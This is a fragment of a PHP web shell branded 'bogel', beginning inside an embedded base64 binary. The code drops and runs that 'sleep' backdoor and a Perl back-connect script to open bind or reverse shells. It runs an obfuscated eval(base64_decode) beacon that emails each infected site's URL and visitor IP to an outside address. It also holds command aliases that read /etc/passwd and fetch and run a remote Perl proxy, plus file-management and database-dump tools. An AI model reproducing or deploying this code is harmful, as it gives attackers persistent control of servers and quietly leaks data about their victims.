8yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";
function cf($fname,$text) {
  $w_file=@fopen($fname,"w") or err();
  if($w_file) {
    @fputs($w_file,@base64_decode($text));
    @fclose($w_file);
  }
}

function cfb($fname,$text) {
  $w_file=@fopen($fname,"w") or bberr();
  if($w_file) {
    @fputs($w_file,@base64_decode($text));
    @fclose($w_file);
  }
}
function err() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> Can't connect!"; }
function bberr() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> Can't backdoor host!"; }

if (!empty($_POST['backconnectport']) && ($_POST['use']=="sleep")) {
  $ip = gethostbyname($_SERVER["HTTP_HOST"]);
  $por = $_POST['backconnectport'];
  if (is_writable(".")) {
    cfb("sleep",$backdoor);
    ex("chmod 755 sleep");
    $cmd = "./sleep $por";
    exec("$cmd > /dev/null &");
    $scan = myshellexec("ps -aux");
  } else {
    cfb("/tmp/sleep",$backdoor);
    ex("chmod 755 /tmp/sleep");
    $cmd = "./tmp/sleep $por";
    exec("$cmd > /dev/null &");
    $scan = myshellexec("ps -aux");
  }
  if (eregi("./sleep $por",$scan)) {
    $data = ("\n<br>ngebind berhasil gan.");
  } else {
    $data = ("\n<br>ngebind gagal gan :(");
  }
  $_POST['backcconnmsg']="To connect, use netcat! Usage: <b>'nc $ip $por'</b>.$data";
}

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl")) {
  if (is_writable(".")) {
    cf("back",$back_connect_pl);
    $p2 = which("perl");
    $blah = ex($p2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("back")) { unlink("back"); }
  } else {
    cf("/tmp/back",$back_connect_pl);
    $p2 = which("perl");
    $blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("/tmp/back")) { unlink("/tmp/back"); }
  }
  $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
}

@ini_set("max_execution_time",0);
if (!function_exists("getmicrotime")) {
  function getmicrotime() {
    list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);
  }
}
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
define("starttime",getmicrotime());
$shell_data = "JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIHRoZXJlIHdhcyBhbiBpbmplY3RlZCB0YXJnZXQgb24gJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJrdW5jdW5nYWphQHlhaG9vLmNvLmlkIiwiU2V0b3JhbiBUYXJnZXQgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiLCAiJGJvZHkiKTsgfSBlbHNlIHsgJHZpc2l0Y291bnQ7IH0gc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGNvdW50KTs="; eval(base64_decode($shell_data));
if (get_magic_quotes_gpc()) {
  if (!function_exists("strips")) {
    function strips(&$arr,$k="") {
      if (is_array($arr)) {
        foreach($arr as $k=>$v) {
          if (strtoupper($k) != "GLOBALS") { strips($arr["$k"]); }
        }
      } else {$arr = stripslashes($arr);}
    }
  }
  strips($GLOBALS);
}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
$surl_autofill_include = TRUE; 
foreach($_REQUEST as $k=>$v) { if (!isset($$k)) {$$k = $v;} }
if ($surl_autofill_include) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
    $v = explode("=",$v);
    $name = urldecode($v[0]);
    $value = urldecode($v[1]);
    foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
      if (strpos($value,$needle) === 0) {
        $includestr .= urlencode($name)."=".urlencode($value)."&";
      }
    }
  }
}
if (empty($surl)) {
  $surl = "?".$includestr; 
}
$surl = htmlspecialchars($surl);

$ftypes  = array(
    "html"=>array("html","htm","shtml"),
    "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
    "exe"=>array("sh","install","bat","cmd"),
    "ini"=>array("ini","inf","conf"),
    "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
    "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
    "sdb"=>array("sdb"),
    "phpsess"=>array("sess"),
    "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
$exeftypes  = array(
    getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
    "perl %f%" => array("pl","cgi")
);
$regxp_highlight  = array(
    array(basename($_SERVER["PHP_SELF"]),1,"<font color=#FFFF00>","</font>"),
    array("\.tgz$",1,"<font color=#C082FF>","</font>"),
    array("\.gz$",1,"<font color=#C082FF>","</font>"),
    array("\.tar$",1,"<font color=#C082FF>","</font>"),
    array("\.bz2$",1,"<font color=#C082FF>","</font>"),
    array("\.zip$",1,"<font color=#C082FF>","</font>"),
    array("\.rar$",1,"<font color=#C082FF>","</font>"),
    array("\.php$",1,"<font color=#00FF00>","</font>"),
    array("\.php3$",1,"<font color=#00FF00>","</font>"),
    array("\.php4$",1,"<font color=#00FF00>","</font>"),
    array("\.jpg$",1,"<font color=#00FFFF>","</font>"),
    array("\.jpeg$",1,"<font color=#00FFFF>","</font>"),
    array("\.JPG$",1,"<font color=#00FFFF>","</font>"),
    array("\.JPEG$",1,"<font color=#00FFFF>","</font>"),
    array("\.ico$",1,"<font color=#00FFFF>","</font>"),
    array("\.gif$",1,"<font color=#00FFFF>","</font>"),
    array("\.png$",1,"<font color=#00FFFF>","</font>"),
    array("\.htm$",1,"<font color=#00CCFF>","</font>"),
    array("\.html$",1,"<font color=#00CCFF>","</font>"),
    array("\.txt$",1,"<font color=#C0C0C0>","</font>")
);
if (!$win) {
  $cmdaliases = array(
    array("proses", "ps -x"),
    array("issue", "cat /etc/issue"),
	array("redhat", "cat /etc/redhat-release"),
    array("debian", "cat /etc/debian_version"),
	array("passwd", "cat /etc/passwd"),
    array("mkdir", "mkdir ..."),
    array("mmap", "cat /proc/sys/vm/mmap_min_addr"),
    array("777", "find -type d -perm 777"),
    array("cari php", "find |grep .php"),
    array("named", "ls -la /var/named"),
    array("killall perl", "killall -9 perl"),
    array("killall php", "killall -9 php"),
    array("proxy", "wget http://brb.is/.../proxy.txt;perl proxy.txt 1945"),
	array("port", "netstat -an | grep -i listen"),
  );
  
}
$quicklaunch1 = array(
			array('<font color=#00bb11>bogel</font>',$surl),
			array("<font color=#00bb11>backdoor</font>",$surl."x=sleep"),
			array("<font color=#00bb11>backconnect</font>",$surl."x=konak"),
			array("<font color=#00bb11>cPanel</font>",$surl."x=cP"),
			array("<font color=#00bb11>mysQL</font>",$surl."x=sql&d=%d"),
			array("<font color=#00bb11>Jumping</font>",$surl."x=jump"),
			array("<font color=#00bb11>PHP-Info</font>",$surl."x=security&d=%d"),    
			array("<font color=#00bb11>Proses</font>",$surl."x=processes&d=%d"),
			array("<font color=#00bb11>Scan</font>",$surl."x=sken"),
		    array("<font fcolor=#00bb11>Symlink</font>",$surl."x=sym&x=sym")
			
   ); 

$highlight_background = "#C0C0C0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["bogelcook"]);
@set_time_limit(0);
$tmp = array();
foreach ($host_allow as $k=>$v) { $tmp[] = str_replace("\\*",".*",preg_quote($v)); }
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {
  exit("<a href=\"$sh_mainurl\">$sh_name</a>: Access Denied - Your host (".getenv("REMOTE_ADDR").") not allowed");
}

if ($x != "img") {
  $lastdir = realpath(".");
  chdir($curdir);
  if ($selfwrite) {
    @ob_clean();
    bogel_getupdate($selfwrite,1);
    exit;
  }
  $sess_data = unserialize($_COOKIE["$sess_cookie"]);
  if (!is_array($sess_data)) {$sess_data = array();}
  if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
  if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
  if (!function_exists("cagetsource")) {
    function cagetsource($fn) {
      global $bogel_sourcesurl;
      $array = array(
        "bogel_bindport.pl" => "bogel_bindport_pl.txt",
        "bogel_bindport.c" => "bogel_bindport_c.txt",
        "bogel_backconn.pl" => "bogel_backconn_pl.txt",
        "bogel_backconn.c" => "bogel_backconn_c.txt",
        "bogel_datapipe.pl" => "bogel_datapipe_pl.txt",
        "bogel_datapipe.c" => "bogel_datapipe_c.txt",
      );
      $name = $array[$fn];
      if ($name) {return file_get_contents($bogel_sourcesurl.$name);}
      else {return FALSE;}
    }
  }
  if (!function_exists("ca_buff_prepare")) {
    function ca_buff_prepare() {
      global $sess_data;
      global $x;
      foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
      foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
      $sess_data["copy"] = array_unique($sess_data["copy"]);
      $sess_data["cut"] = array_unique($sess_data["cut"]);
      sort($sess_data["copy"]);
      sort($sess_data["cut"]);
      if ($x != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
      else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
    }
  }
  ca_buff_prepare();
  if (!function_exists("ca_sess_put")) {
    function ca_sess_put($data) {
      global $sess_cookie;
      global $sess_data;
      ca_buff_prepare();
      $sess_data = $data;
      $data = serialize($data);
      setcookie($sess_cookie,$data);
    }
  }
  foreach (array("sort","sql_sort") as $v) {
    if (!empty($_GET[$v])) {$$v = $_GET[$v];}
    if (!empty($_POST[$v])) {$$v = $_POST[$v];}
  }
  if ($sort_save) {
    if (!empty($sort)) {setcookie("sort",$sort);}
    if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
  }
  if (!function_exists("str2mini")) {
    function str2mini($content,$len) {
      if (strlen($content) > $len) {
        $len = ceil($len/2) - 2;
        return substr($content, 0,$len)."...".substr($content,-$len);
      } else {return $content;}
    }
  }
  if (!function_exists("view_size")) {
    function view_size($size) {
      if (!is_numeric($size)) { return FALSE; }
      else {
        if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
        elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
        elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
        else {$size = $size . " B";}
        return $size;
      }
    }
  }
  if (!function_exists("fs_copy_dir")) {
    function fs_copy_dir($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
      $h = opendir($d);
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
      return TRUE;
    }
  }
  if (!function_exists("fs_copy_obj")) {
    function fs_copy_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
      if (!is_dir(dirname($t))) {mkdir(dirname($t));}
      if (is_dir($d)) {
        if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
        if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
        return fs_copy_dir($d,$t);
      }
      elseif (is_file($d)) { return copy($d,$t); }
      else { return FALSE; }
    }
  }
  if (!function_exists("fs_move_dir")) {
    function fs_move_dir($d,$t) {
      $h = opendir($d);
      if (!is_dir($t)) {mkdir($t);}
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          $ret = TRUE;
          if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
      return TRUE;
    }
  }
  if (!function_exists("fs_move_obj")) {
    function fs_move_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
      if (is_dir($d)) {
        if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
        if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
        return fs_move_dir($d,$t);
      }
      elseif (is_file($d)) {
        if(copy($d,$t)) {return unlink($d);}
        else {unlink($t); return FALSE;}
      }
      else {return FALSE;}
    }
  }
  if (!function_exists("fs_rmdir")) {
    function fs_rmdir($d) {
      $h = opendir($d);
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          if (!is_dir($d.$o)) {unlink($d.$o);}
          else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
        }
      }
      closedir($h);
      rmdir($d);
      return !is_dir($d);
    }
  }
  if (!function_exists("fs_rmobj")) {
    function fs_rmobj($o) {
      $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
      if (is_dir($o)) {
        if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
        return fs_rmdir($o);
      }
      elseif (is_file($o)) {return unlink($o);}
      else {return FALSE;}
    }
  }
  if (!function_exists("tabsort")) {
    function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}
  }
  if (!function_exists("view_perms")) {
    function view_perms($mode) {
      if (($mode & 0xC000) === 0xC000) {$type = "s";}
      elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
      elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
      elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
      elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
      elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
      elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
      else {$type = "?";}
      $owner["read"] = ($mode & 00400)?"r":"-";
      $owner["write"] = ($mode & 00200)?"w":"-";
      $owner["execute"] = ($mode & 00100)?"x":"-";
      $group["read"] = ($mode & 00040)?"r":"-";
      $group["write"] = ($mode & 00020)?"w":"-";
      $group["execute"] = ($mode & 00010)?"x":"-";
      $world["read"] = ($mode & 00004)?"r":"-";
      $world["write"] = ($mode & 00002)? "w":"-";
      $world["execute"] = ($mode & 00001)?"x":"-";
      if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
      if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
      if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
      return $type.join("",$owner).join("",$group).join("",$world);
    }
  }
  if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
  if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
  if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
  if (!function_exists("parse_perms")) {
    function parse_perms($mode) {
      if (($mode & 0xC000) === 0xC000) {$t = "s";}
      elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
      elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
      elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
      elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
      elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
      elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
      else {$t = "?";}
      $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
      $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
      $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
      return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
    }
  }
  if (!function_exists("parsesort")) {
    function parsesort($sort) {
      $one = intval($sort);
      $second = substr($sort,-1);
      if ($second != "d") {$second = "a";}
      return array($one,$second);
    }
  }
  if (!function_exists("view_perms_color")) {
    function view_perms_color($o) {
      if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
      elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
      else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
    }
  }
  if (!function_exists("mysql_dump")) {
    function mysql_dump($set) {
      global $sh_ver;
      $sock = $set["sock"];
      $db = $set["db"];
      $print = $set["print"];
      $nl2br = $set["nl2br"];
      $file = $set["file"];
      $add_drop = $set["add_drop"];
      $tabs = $set["tabs"];
      $onlytabs = $set["onlytabs"];
      $ret = array();
      $ret["err"] = array();
      if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
      if (empty($db)) {$db = "db";}
      if (empty($print)) {$print = 0;}
      if (empty($nl2br)) {$nl2br = 0;}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (empty($file)) {
        $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
      }
      if (!is_array($tabs)) {$tabs = array();}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (sizeof($tabs) == 0) {
        $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
        if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
      }
      $out = "
      # Dumped by ".$sh_name."
      #
      # Host settings:
      # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
      # Date: ".date("d.m.Y H:i:s")."
      # DB: \"".$db."\"
      #---------------------------------------------------------";
      $c = count($onlytabs);
      foreach($tabs as $tab) {
        if ((in_array($tab,$onlytabs)) or (!$c)) {
          if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
          $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
          if (!$res) {$ret["err"][] = mysql_smarterror();}
          else {
            $row = mysql_fetch_row($res);
            $out .= $row["1"].";\n\n";
            $res = mysql_query("SELECT * FROM `$tab`", $sock);
            if (mysql_num_rows($res) > 0) {
              while ($row = mysql_fetch_assoc($res)) {
                $keys = implode("`, `", array_keys($row));
                $values = array_values($row);
                foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
                $values = implode("', '", $values);
                $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
                $out .= $sql;
              }
            }
          }
        }
      }
      $out .= "#---------------------------------------------------------------------------------\n\n";
      if ($file) {
        $fp = fopen($file, "w");
        if (!$fp) {$ret["err"][] = 2;}
        else {
          fwrite ($fp, $out);
          fclose ($fp);
        }
      }
      if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
      return $out;
    }
  }
  if (!function_exists("mysql_buildwhere")) {
    function mysql_buildwhere($array,$sep=" and",$functs=array()) {
      if (!is_array($array)) {$array = array();}
      $result = "";
      foreach($array as $k=>$v) {
        $value = "";
        if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
        $value .= "'".addslashes($v)."'";
        if (!empty($functs[$k])) {$value .= ")";}
        $result .= "`".$k."` = ".$value.$sep;
      }
      $result = substr($result,0,strlen($result)-strlen($sep));
      return $result;
    }
  }
  if (!function_exists("mysql_fetch_all")) {
    function mysql_fetch_all($query,$sock) {
      if ($sock) {$result = mysql_query($query,$sock);}
      else {$result = mysql_query($query);}
      $array = array();
      while ($row = mysql_fetch_array($result)) {$array[] = $row;}
      mysql_free_result($result);
      return $array;
    }
  }
  if (!function_exists("mysql_smarterror")) {
    function mysql_smarterror($type,$sock) {
      if ($sock) {$error = mysql_error($sock);}
      else {$error = mysql_error();}
      $error = htmlspecialchars($error);
      return $error;
    }
  }
  if (!function_exists("mysql_query_form")) {
    function mysql_query_form() {
      global $submit,$sql_x,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
      if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
      if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
      if ((!$submit) or ($sql_x)) {
        echo "<table border=0><tr><td><form name=\"bogel_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=x value=sql><input type=hidden name=sql_x value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
        if ($tbl_struct) {
          echo "<td valign=\"top\"><b>Fields:</b><br>";
          foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.bogel_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
          echo "</td></tr></table>";
        }
      }
      if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
    }
  }
  if (!function_exists("mysql_create_db")) {
    function mysql_create_db($db,$sock="") {
      $sql = "CREATE DATABASE `".addslashes($db)."`;";
      if ($sock) {return mysql_query($sql,$sock);}
      else {return mysql_query($sql);}
    }
  }
  if (!function_exists("mysql_query_parse")) {
    function mysql_query_parse($query) {
      $query = trim($query);
      $arr = explode (" ",$query);
      $types = array(
        "SELECT"=>array(3,1),
        "SHOW"=>array(2,1),
        "DELETE"=>array(1),
        "DROP"=>array(1)
      );
      $result = array();
      $op = strtoupper($arr[0]);
      if (is_array($types[$op])) {
        $result["propertions"] = $types[$op];
        $result["query"]  = $query;
        if ($types[$op] == 2) {
          foreach($arr as $k=>$v) {
            if (strtoupper($v) == "LIMIT") {
              $result["limit"] = $arr[$k+1];
              $result["limit"] = explode(",",$result["limit"]);
              if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
              unset($arr[$k],$arr[$k+1]);
            }
          }
        }
      }
      else {return FALSE;}
    }
  }
  if (!function_exists("cafsearch")) {
    function cafsearch($d) {
      global $found;
      global $found_d;
      global $found_f;
      global $search_i_f;
      global $search_i_d;
      global $a;
      if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
      $h = opendir($d);
      while (($f = readdir($h)) !== FALSE) {
        if($f != "." && $f != "..") {
          $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
          if (is_dir($d.$f)) {
            $search_i_d++;
            if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
            if (!is_link($d.$f)) {cafsearch($d.$f);}
          }
          else {
            $search_i_f++;
            if ($bool) {
              if (!empty($a["text"])) {
                $r = @file_get_contents($d.$f);
                if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
                if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
                if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
                else {$bool = strpos(" ".$r,$a["text"],1);}
                if ($a["text_not"]) {$bool = !$bool;}
                if ($bool) {$found[] = $d.$f; $found_f++;}
              }
              else {$found[] = $d.$f; $found_f++;}
            }
          }
        }
      }
      closedir($h);
    }
  }
  if ($x == "gofile") {
    if (is_dir($f)) { $x = "ls"; $d = $f; }
    else { $x = "f"; $d = dirname($f); $f = basename($f); }
  }
  @ob_start();
  @ob_implicit_flush(0);
  function onphpshutdown() {
    global $gzipencode,$ft;
    if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {
      $v = @ob_get_contents();
      @ob_end_clean();
      @ob_start("ob_gzHandler");
      echo $v;
      @ob_end_flush();
    }
  }
  function bogelexit() {
    onphpshutdown();
    exit;
  }
  header("Expires: Mon, 12 Dec 2012 05:00:00 GMT");
  header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", FALSE);
  header("Pragma: no-cache");
  if (empty($tmpdir)) {
    $tmpdir = ini_get("upload_tmp_dir");
    if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
  }
  $tmpdir = realpath($tmpdir);
  $tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
  if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
  if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
  else {$tmpdir_logs = realpath($tmpdir_logs);}
  function showstat($stat) {
    if ($stat=="on") { return "<font color=#00FF00><b>ON</b></font>"; }
    else { return "<font color=#FF9900><b>OFF</b></font>"; }
  }
  function testSH() {
    if (ex('sh --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
   function testgcc() {
    if (ex('gcc --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testperl() {
    if (ex('perl --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testfetch() {
    if(ex('fetch --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testwget() {
    if (ex('wget --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testcurl() {
    if (function_exists('curl_version')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmysql() {
    if (function_exists('mysql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<font color=#FF9900><b>".$disablefunc."</b></font>"; }
    else { return "<font color=#00FF00><b>NONE</b></b></font>"; }
  }
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=#3366FF><b>SAFE MODE is ON ( FUCK )</b></font>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<font color=#FF9900><b>SAFE MODE is OFF ( OKE )</b></font>";
  }
  $v = @ini_get("open_basedir");
  if ($v or strtolower($v) == "on") {
    $openbasedir = TRUE;
    $hopenbasedir = "<font color=red>".$v."</font>";
  }
  else {
    $openbasedir = FALSE;
    $hopenbasedir = "<font color=green>OFF ( OKE )</font>";
  }
  $sort = htmlspecialchars($sort);
  if (empty($sort)) {$sort = $sort_default;}
  $sort[1] = strtolower($sort[1]);
  $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
  if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
  $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."x=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
  @ini_set("highlight.bg",$highlight_bg);
  @ini_set("highlight.comment",$highlight_comment);
  @ini_set("highlight.default",$highlight_default);
  @ini_set("highlight.html",$highlight_html);
  @ini_set("highlight.keyword",$highlight_keyword);
  @ini_set("highlight.string",$highlight_string);
  if (!is_array($actbox)) { $actbox = array(); }
  $dspact = $x = htmlspecialchars($x);
  $disp_fullpath = $ls_arr = $notls = null;
  $ud = urlencode($d);
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (empty($d)) {$d = realpath(".");}
  elseif(realpath($d)) {$d = realpath($d);}
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $d = str_replace("\\\\","\\",$d);
  $dispd = htmlspecialchars($d);
echo $html_start;
